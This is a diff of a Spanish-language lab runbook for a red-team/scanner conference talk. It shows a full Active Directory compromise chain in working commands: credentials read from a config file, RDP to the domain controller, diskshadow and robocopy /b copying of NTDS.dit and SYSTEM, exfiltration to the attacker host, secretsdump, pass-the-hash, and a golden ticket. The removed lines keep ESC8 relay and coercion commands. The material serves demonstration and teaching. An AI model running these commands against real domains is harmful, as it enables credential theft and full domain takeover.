@@ -29,7 +29,6 @@ cd ~/bifrost
 | `LHOST` | `10.10.0.66` | tu host (atacante) en VMnet1 |
 | `TARGET_WEB` | `10.10.0.20` | web01 (Solr) |
 | `TARGET_DC` | `10.10.0.30` | dc01 (AD + ADCS) |
-| `TARGET_WS` | `10.10.0.31` | ws01 (Windows 10) |
 | `BIFROST_DOMAIN` | `corp.local` | dominio |
 | `BIFROST_SOLR_PORT` / `LDAP_PORT` / `HTTP_PORT` / `REVSHELL_PORT` | `8983` / `1389` / `8000` / `4444` | puertos del laboratorio |
 
@@ -260,19 +259,18 @@ credenciales". Cada equipo pone la mitad.
 
 ---
 
-## 4. Puente 3 — Lateral: `svc_backup` → ws01
+## 4. Puente 3 — Credenciales de dominio (`svc_backup`)
 
-### El servicio
+### La credencial
 
-**Qué es SMB.** *Server Message Block*, el protocolo de compartición de archivos
-e impresoras de Windows. Con credenciales de dominio, permite autenticarse y
-**enumerar recursos compartidos**. Es el equivalente a "entrar a la carpeta
-compartida de la empresa".
+**Qué es.** `svc_backup` es una cuenta de **servicio de dominio** (no local) cuyo
+propósito es ejecutar copias de seguridad. En el laboratorio viaja en claro en la
+configuración de la app interna de `web01`.
 
 ### Cómo lo encuentra el atacante
 
-Root en `web01` = leer cualquier archivo del sistema. El *deploy* en `/opt/app`
-tiene credenciales de dominio en claro.
+Root en `web01` = leer cualquier archivo. El *deploy* en `/opt/app` tiene las
+credenciales de dominio en claro:
 
 ```bash
 cat /opt/app/config.yml
@@ -285,10 +283,10 @@ domain:
   bind_password: "Verano2024!"
 ```
 
-Vuelves a tu host y **validas** esas credenciales contra `ws01`:
+De vuelta en tu host, **valida** la credencial contra el DC:
 
 ```bash
-nxc smb "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" --shares
+nxc smb "$TARGET_DC" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS"
 ```
 
 | Parámetro | Qué hace |
@@ -296,21 +294,11 @@ nxc smb "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" --shares
 | `nxc` | *netexec* (sucesor de `crackmapexec`): ejecución de módulos de red. |
 | `smb` | protocolo a usar (SMB, puerto 445). |
 | `-u` / `-p` | usuario y contraseña de dominio (`svc_backup` / `Verano2024!`). |
-| `--shares` | enumera los recursos compartidos visibles para esa cuenta. |
+| `$TARGET_DC` | el DC (`10.10.0.30`); `[+]` confirma que la credencial es válida. |
 
-`svc_backup` **no** es administrador de `ws01` (es un usuario de dominio normal),
-así que no hay shell aquí. El valor del salto es confirmar que la credencial es
-**válida** y leer el share `Compartido` y sus señuelos:
-
-```bash
-smbclient "//$TARGET_WS/Compartido" -U "$BIFROST_SVC_USER%$BIFROST_SVC_PASS" -c 'ls'
-```
-
-| Parámetro | Qué hace |
-|---|---|
-| `"//IP/Compartido"` | recurso SMB a abrir (UNC path). |
-| `-U 'usuario%contraseña'` | autenticación en una sola cadena (separador `%`). |
-| `-c 'ls'` | ejecuta el comando `ls` en el recurso y sale. |
+`svc_backup` **no** es administrador de nada: es un usuario de dominio normal. El
+valor del puente es que la credencial es **válida** y que en el DC está en
+`Backup Operators` y `Remote Desktop Users` (el siguiente puente).
 
 > **Speech (los dos lados):**
 > **Red team:** *"Root en una máquina no es el objetivo; el objetivo es el
@@ -327,115 +315,196 @@ qué arreglar primero; el red team **demuestra** por qué ese orden importa.
 
 ---
 
-## 5. Puente 4 — ESC8 → Domain Admin
+## 5. Puente 4 — Backup Operators + NTDS.dit → Domain Admin
 
 ### Los servicios y la vulnerabilidad
 
-**Qué es ADCS.** *Active Directory Certificate Services*: la autoridad de
-certificados de Windows. **Web Enrollment** es una aplicación IIS en `/certsrv`
-que permite solicitar certificados por HTTP, autenticando con NTLM.
+**Qué es Backup Operators.** Es un grupo **Builtin** de Windows cuyo propósito
+legítimo es hacer copias de seguridad: sus miembros reciben los privilegios
+**`SeBackupPrivilege`** y **`SeRestorePrivilege`**. En un DC, ese grupo puede
+iniciar sesión localmente y leer archivos que el propio administrador no puede
+abrir con una copia normal.
 
-**Qué es ESC8.** El abuso de esa configuración: si `/certsrv` acepta **NTLM sobre
-HTTP** (sin TLS), un atacante puede **retransmitir** la autenticación del propio
-DC a esa web y obtener un **certificado de la cuenta de equipo `dc01$`**. Con ese
-certificado obtienes un TGT de `dc01$`, y con él, permiso para **DCSync**.
+**Qué es `SeBackupPrivilege`.** Es el privilegio "Back up files and directories":
+permite abrir cualquier archivo **ignorando las ACLs** y los bloqueos. El
+`NTDS.dit` está abierto por el servicio `NTDS`, así que sin este privilegio no se
+puede copiar en caliente. Ojo: `robocopy /b` **habilita** el privilegio por sí
+mismo; `reg save` **no**, y con `svc_backup` da `Access is denied`.
 
-**Qué es DCSync.** Una técnica que usa la **API de replicación de Active
-Directory** (DRSUAPI) para pedir a un DC los *hashes* de cuentas como si fueras
-otro DC. El objetivo es el hash de **`krbtgt`**, la cuenta que firma los TGT: con
-él se pueden forjar tickets (golden ticket).
+**Qué es `NTDS.dit`.** Es la **base de datos de Active Directory**
+(`C:\Windows\NTDS\ntds.dit`): contiene todos los objetos del dominio, incluidos
+los **hashes** de las cuentas. El hive **`SYSTEM`**
+(`C:\Windows\System32\config\SYSTEM`) guarda la clave de arranque (`BootKey`) con
+la que se cifran esos hashes.
+
+**Qué es `diskshadow`.** Es la herramienta de **Volume Shadow Copy (VSS)** de
+Windows. Crea una **sombra** del volumen y la expone como otra letra (`Z:`), de
+modo que se puede copiar el `NTDS.dit` **sin detener AD** y sin que el archivo
+esté bloqueado.
+
+**Qué es DCSync / `krbtgt`.** La **API de replicación** (DRSUAPI) permite a un DC
+pedir a otro los hashes de las cuentas. El hash de **`krbtgt`** firma los TGT: con
+él se forjan **golden tickets**. Pero aquí no hace falta DCSync en línea: el
+`NTDS.dit` copiado ya trae **todos** los hashes, `krbtgt` incluido.
 
 ### Cómo lo encuentra el atacante
 
-Ya eres un usuario de dominio (`svc_backup`). El DC tiene ADCS con Web Enrollment
-sobre HTTP. Eso habilita ESC8.
+El `svc_backup` es un usuario de dominio **normal** (solo `Domain Users`), pero en
+el DC está en dos grupos Builtin que el laboratorio deja así a propósito:
 
-**Terminal 1** — el relay (escucha en **445/tcp**; `attacker-tools.sh` ya abrió
-ese puerto en ufw):
+- **`Backup Operators`** → `SeBackupPrivilege`: puede copiar el `NTDS.dit`.
+- **`Remote Desktop Users`** → puede iniciar sesión por **RDP** en el DC.
+
+El atacante no "rompe" nada: **usa la combinación**. El `SeBackupPrivilege` le
+deja leer la base de AD; el RDP le da el escritorio para ejecutar `diskshadow` y
+`robocopy /b`.
+
+**Terminal 1 — RDP al DC como `svc_backup`:**
 
 ```bash
-source ~/bifrost/env.sh
-mkdir -p ~/bifrost/loot
-ntlmrelayx.py -t "http://$TARGET_DC/certsrv/certfnsh.asp" \
-  -smb2support --adcs --template DomainController -l ~/bifrost/loot
+xfreerdp3 /v:"$TARGET_DC" /u:'svc_backup' /d:'corp.local' /p:'Verano2024!' /cert:ignore /sec:nla \
+  /drive:loot,/home/bard/bifrost/loot
 ```
 
 | Parámetro | Qué hace |
 |---|---|
-| `-t URL` | objetivo del relay: la web de inscripción que emite el certificado. |
-| `-smb2support` | habilita SMB2/3 (lo exige el DC moderno). |
-| `--adcs` | modo ADCS: en vez de volcar hashes, **solicita un certificado**. |
-| `--template DomainController` | plantilla a usar (la que permite inscribir a `dc01$`). |
-| `-l DIR` | carpeta donde guardar el *loot* (el PFX). En impacket 0.12 es `-l`, no `--output-folder`. |
+| `/v:$TARGET_DC` | host al que conectarse (el DC, `10.10.0.30`). |
+| `/u:'svc_backup'` | usuario de dominio, **sin `CORP\`** (así no intenta Kerberos con realm `CORP`). |
+| `/d:'corp.local'` | dominio; evita el `Cannot find KDC for realm "CORP"`. |
+| `/p:'Verano2024!'` | su contraseña (la del `config.yml` de `web01`). |
+| `/cert:ignore` | acepta el certificado autofirmado del DC (lab). |
+| `/sec:nla` | el DC exige **NLA** (`HYBRID_REQUIRED_BY_SERVER`); con `/sec:tls` falla. |
 
-**Terminal 2** — fuerzas al DC a autenticarse contra ti (**coacción**):
+**En el DC — `diskshadow` interactivo (el que funciona):**
 
-```bash
-PetitPotam.py -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" -d "$BIFROST_DOMAIN" \
-  "$LHOST" "$TARGET_DC"
+```powershell
+diskshadow
+set context persistent nowriters
+add volume c: alias ntds
+create
+expose %ntds% z:
+exit
+```
+
+| Línea | Qué hace |
+|---|---|
+| `set context persistent nowriters` | contexto VSS persistente y sin escritores (no toca el servicio de AD). |
+| `add volume c: alias ntds` | añade el volumen `C:` con el alias `ntds`. |
+| `create` | crea la sombra. |
+| `expose %ntds% z:` | monta la sombra como `Z:`. |
+| `exit` | sale de `diskshadow`. |
+
+> Si `expose` dice `The drive letter is already in use`, la sombra anterior
+> sigue montada en `Z:`: `unexpose z:` (o monta la nueva en `y:`) y vuelve a
+> exponer. Si prefieres un `ds.txt`, escríbelo con `Set-Content` y **un solo
+> `%ntds%`**: con `cmd /c echo` el `%ntds%` se expande antes de que `diskshadow`
+> defina el alias; con `%%ntds%%` busca el alias `%%ntds%%` y falla. Con
+> `Out-File`/here-string el `nowriters` puede llegar como `nowriter` y
+> `diskshadow` imprime la ayuda **sin crear `Z:`**.
+
+**Copiar `NTDS.dit` y `SYSTEM` con `/b`:**
+
+```powershell
+robocopy /b z:\Windows\NTDS C:\Users\svc_backup ntds.dit
+robocopy /b z:\Windows\System32\config C:\Users\svc_backup SYSTEM
 ```
 
 | Parámetro | Qué hace |
 |---|---|
-| `-u` / `-p` | credenciales de dominio (`svc_backup`). |
-| `-d` | dominio (`corp.local`). |
-| `$LHOST` | **tu** IP: hacia donde el DC se autentica. |
-| `$TARGET_DC` | el DC que quieres coaccionar. |
+| `/b` | modo **backup**: habilita `SeBackupPrivilege` y salta ACLs y bloqueos. |
+| `z:\Windows\NTDS` | la sombra del volumen (la base de AD). |
+| `ntds.dit` | el archivo que se copia. |
+| `C:\Users\svc_backup` | perfil de `svc_backup`: escribe ahí sin los problemas de ACL de `C:\Windows\Temp`. |
+| `z:\Windows\System32\config` | la sombra del hive `SYSTEM` (la `BootKey`). |
 
-La terminal 1 imprime y guarda el **PFX** de `dc01$`.
+> `robocopy /b` funciona con `svc_backup` porque **habilita** el privilegio.
+> `reg save HKLM\SYSTEM` **no** lo hace y da `Access is denied`; como
+> `Administrator` sí funciona.
 
-**Terminal 3** — el certificado se convierte en identidad (suele llamarse
-`DC01$.pfx`):
+**Exfiltrar al host como `svc_backup` (sin `Administrator`):**
+
+Con la unidad redirigida (`/drive:loot,...`), `\\tsclient\loot` es el `loot` del
+host:
+
+```powershell
+copy C:\Users\svc_backup\ntds.dit \\tsclient\loot\ntds.dit
+copy C:\Users\svc_backup\SYSTEM  \\tsclient\loot\SYSTEM
+```
+
+> **Antes**, en el host: `chmod 777 /home/bard/bifrost/loot`. El `svc_backup`
+> llega por el canal RDP como otro usuario y necesita escritura en el `loot`.
+
+> Alternativa sin RDP: en el host
+> `impacket-smbserver loot /home/bard/bifrost/loot -smb2support -username svc -password 'Verano2024!'`.
+> Sin `-username/-password` el DC rechaza el **guest**
+> (`... security policies block unauthenticated guest access`). Desde el DC, como
+> `svc_backup`, `copy C:\Users\svc_backup\ntds.dit \\10.10.0.66\loot\ntds.dit`
+> y lo mismo con `SYSTEM`.
+
+**Volcar los hashes (hacen falta los DOS archivos):**
 
 ```bash
-certipy auth -pfx ~/bifrost/loot/DC01\$.pfx -dc-ip "$TARGET_DC"
+impacket-secretsdump -ntds /home/bard/bifrost/loot/ntds.dit \
+  -system /home/bard/bifrost/loot/SYSTEM LOCAL
 ```
 
 | Parámetro | Qué hace |
 |---|---|
-| `auth` | se autentica usando el certificado. |
-| `-pfx` | el certificado de `dc01$` obtenido por el relay. |
-| `-dc-ip` | el DC contra el que autenticarse. |
+| `-ntds` | el `ntds.dit` copiado. |
+| `-system` | el hive `SYSTEM` (contiene la `BootKey`). |
+| `LOCAL` | modo offline: no contacta al DC. |
 
-Anota el hash NTLM de `DC01$` y haz DCSync:
+> Sin `SYSTEM` no hay `BootKey` y `secretsdump` falla con
+> `No such file or directory: 'SYSTEM'`. Es el error típico si solo copiaste el
+> `ntds.dit`.
+
+La salida trae `Administrator:500:...` y `krbtgt:502:...`. Con el hash del
+`Administrator` cierras:
 
 ```bash
-secretsdump.py -just-dc-user krbtgt "$BIFROST_DOMAIN/DC01\$"@"$TARGET_DC" -hashes :<HASH>
+impacket-psexec -hashes :<HASH_ADMIN> 'corp.local/Administrator@'"$TARGET_DC"
+type C:\Corp\Finanzas\Q4_Forecast_2026.txt
 ```
 
 | Parámetro | Qué hace |
 |---|---|
-| `-just-dc-user krbtgt` | limita el volcado a esa cuenta (no todo el dominio). |
-| `dominio/DC01$@DC` | identidad usada (la cuenta de equipo). |
-| `-hashes :NTLM` | autenticación por *hash* en vez de contraseña. |
+| `-hashes :NTLM` | *pass-the-hash* con el hash del `Administrator` (sin contraseña). |
+| `corp.local/Administrator@DC` | identidad y destino. |
+| `type ...` | lee el archivo de negocio (impacto controlado). |
 
-El hash de `krbtgt` en pantalla es el clímax. Cierra con una shell de
-administrador:
+**Golden Ticket (opcional, con el `krbtgt`):**
 
 ```bash
-psexec.py -k -no-pass "$BIFROST_DOMAIN/Administrator@$TARGET_DC"
-dir C:\Corp\Finanzas
+impacket-ticketer -nthash <HASH_KRBTGT> \
+  -domain-sid S-1-5-21-3110217645-1558988347-1089824859 \
+  -domain corp.local Administrator
+
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass 'corp.local/Administrator@DC01.corp.local'
 ```
 
 | Parámetro | Qué hace |
 |---|---|
-| `-k` | autenticación **Kerberos** (usa el ticket del *ccache* que generó `certipy`). |
-| `-no-pass` | no pide contraseña (usa el ticket). |
-| `dominio/Administrator@DC` | identidad y destino. |
+| `-nthash` | hash del `krbtgt`. |
+| `-domain-sid` | SID del dominio (de `Get-ADDomain` o `whoami /user`). |
+| `-domain` | dominio. |
+| `KRB5CCNAME` | el *ccache* del ticket forjado. |
+| `-k -no-pass` | usa Kerberos sin contraseña. |
 
 > **Speech (los dos lados):**
-> **Red team:** *"Ninguna de las piezas de ESC8 es un 10.0: HTTP en vez de HTTPS,
-> NTLM en vez de Kerberos, una plantilla que las máquinas pueden inscribir, una
-> coacción de autenticación. Juntas son el dominio entero. El escáner no puede
-> puntuar 'el conjunto'; el red team sí lo demuestra."*
-> **Tenable:** *"Y la ruta ya estaba en el producto: **Attack Path Analysis**
-> predijo `svc_backup → ADCS → DC01$ → Domain Admin` antes de que el operador se
-> sentara. El red team la ejecutó y la convirtió en una decisión de negocio."*
+> **Red team:** *"No soy administrador: soy un usuario de backup. Pero el
+> `SeBackupPrivilege` me deja leer la base de datos del dominio, y el RDP me da
+> el escritorio para hacerlo. Con `NTDS.dit` y `SYSTEM` tengo el `krbtgt`: el
+> dominio entero."*
+> **Tenable:** *"Y ese es el punto: dos grupos Builtin que por separado parecen
+> inocuos —'copias de seguridad' y 'escritorio remoto'— juntos son la ruta
+> `svc_backup → Backup Operators → DC → NTDS.dit → Domain Admin`. El escáner la
+> modela como Attack Path; el red team la ejecuta."*
 
-**Contraste con Nessus:** si tu feed trae el plugin de ADCS, aparece como
-configuración insegura; si no, **Attack Path Analysis** de Tenable One modela la
-ruta. El escáner **predice**; el red team **verifica**. Ese binomio es la tesis
-de la charla.
+**Contraste con Nessus:** el escáner puede ver el `SeBackupPrivilege` como
+configuración de riesgo y el `Remote Desktop Users` como superficie de acceso.
+Ninguno es un 10.0 por separado; la cadena sí. El escáner **predice la ruta**; el
+red team **demuestra que el `svc_backup` llega al `krbtgt`**.
 
 ---
 
@@ -460,7 +529,78 @@ Lee una línea y **para**. Nada de cifrar, borrar ni exfiltrar.
 
 ---
 
-## 7. Timeline del speech (30 min)
+## 7. Limpieza (volver al estado previo al ataque)
+
+El ataque deja rastros en el DC (sombra, `ntds.dit`/`SYSTEM`, `ds.txt`, `.cab`)
+y en el host (`loot`, `smbserver`, sesión RDP). Esto los quita y deja el
+laboratorio como **antes de comenzar el ataque**: se conserva la configuración
+vulnerable del lab (`svc_backup` en `Backup Operators`/`Remote Desktop Users`,
+RDP y `SeRemoteInteractiveLogonRight`) para poder repetirlo.
+
+### En dc01 (RDP como `svc_backup` o `Administrator`)
+
+```powershell
+diskshadow
+unexpose z:
+delete shadows all
+exit
+```
+
+> Si `unexpose` dice que `z:` no existe, revisa con `list shadows`; el
+> `delete shadows all` borra todas las sombras del lab.
+
+```powershell
+Remove-Item C:\Users\svc_backup\ntds.dit,C:\Users\svc_backup\SYSTEM -Force -ErrorAction SilentlyContinue
+Remove-Item C:\Users\svc_backup\*.cab -Force -ErrorAction SilentlyContinue
+Remove-Item C:\Windows\Temp\ntds.dit,C:\Windows\Temp\SYSTEM,C:\Windows\Temp\ds.txt -Force -ErrorAction SilentlyContinue
+```
+
+Si usaste `psexec` para el impacto, quita su servicio:
+
+```powershell
+sc.exe stop PSEXESVC
+sc.exe delete PSEXESVC
+Remove-Item C:\Windows\PSEXESVC.exe -Force -ErrorAction SilentlyContinue
+```
+
+Verifica:
+
+```powershell
+Get-PSDrive Z -ErrorAction SilentlyContinue     # no debe existir
+Test-Path C:\Users\svc_backup\ntds.dit          # False
+Test-Path C:\Users\svc_backup\SYSTEM            # False
+```
+
+### En el host
+
+```bash
+rm -f /home/bard/bifrost/loot/ntds.dit /home/bard/bifrost/loot/SYSTEM
+rm -f /home/bard/bifrost/loot/*.pfx /home/bard/bifrost/loot/*.ccache 2>/dev/null
+chmod 775 /home/bard/bifrost/loot
+
+pkill -f xfreerdp3 2>/dev/null
+sudo pkill -f impacket-smbserver 2>/dev/null
+
+ls -la /home/bard/bifrost/loot/     # solo PetitPotam (y lo que ya existiera)
+```
+
+### Opcional: desmontar también la configuración del lab
+
+Si quieres volver al estado **anterior a construir la vulnerabilidad** (no solo al
+previo al ataque), en dc01 como `Administrator`:
+
+```powershell
+Remove-ADGroupMember -Identity 'Backup Operators' -Members svc_backup -Confirm:$false
+Remove-ADGroupMember -Identity 'Remote Desktop Users' -Members svc_backup -Confirm:$false
+Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 1
+# y quitar CORP\svc_backup de "Allow log on through Remote Desktop Services"
+# en la Default Domain Controllers Policy (gpmc.msc), luego:
+gpupdate /force
+```
+
+---
+
+## 8. Timeline del speech (30 min)
 
 | Min | Momento | Frase clave (equilibrada) |
 |---|---|---|
@@ -469,13 +609,13 @@ Lee una línea y **para**. Nada de cifrar, borrar ni exfiltrar.
 | 08:00 | Puente 1 | *"un `curl`: el hallazgo sin credenciales se vuelve acceso"* |
 | 12:00 | Puente 2 | *"sin credenciales veo la puerta; con ellas, la casa"* |
 | 15:00 | Puente 3 | *"la credencial viajaba en texto plano; el reporte ya lo marcaba"* |
-| 19:00 | Puente 4 | *"ninguna pieza es un 10.0; juntas son el dominio"* |
+| 19:00 | Puente 4 | *"dos grupos Builtin y un RDP: el dominio entero"* |
 | 24:00 | Impacto | *"se demuestra leyendo"* |
 | 26:00 | Blue team | *"cada puente dejó su firma en los logs"* |
 
 ---
 
-## 8. Cierre (el speech que deja bien a los dos)
+## 9. Cierre (el speech que deja bien a los dos)
 
 > **Red team:** *"El escáner responde '¿qué está roto y por dónde empiezo?'.
 > Nosotros respondemos '¿cuánto duele?'. Sin el escáner, priorizamos a ciegas;
@@ -493,7 +633,7 @@ Lee una línea y **para**. Nada de cifrar, borrar ni exfiltrar.
 source ~/bifrost/env.sh                            # recargar variables
 cd ~/bifrost/exploits/log4shell && ./selftest.sh   # ¿el puente 1 sigue vivo?
 uname -r                                           # kernel correcto para PwnKit
-ls ~/bifrost/loot/                                 # ¿el PFX de ESC8 (DC01$.pfx) existe?
+nxc rdp "$TARGET_DC" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS"   # ¿el RDP de svc_backup sigue?
 ```
 
 **Frase comodín** (ensáyala):
